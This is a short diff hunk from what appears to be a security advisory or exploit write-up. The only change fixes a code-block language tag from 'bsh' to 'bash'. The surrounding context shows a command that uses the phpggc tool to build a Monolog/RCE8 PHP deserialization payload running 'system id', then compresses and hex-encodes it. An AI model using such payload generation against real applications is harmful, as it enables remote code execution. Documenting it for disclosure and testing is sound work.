@@ -181,7 +181,7 @@ Serialized payload generated using the phpggc tool:
 
 Compressed payload is generated using:
 
-```bsh
+```bash
 $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
 ```
 
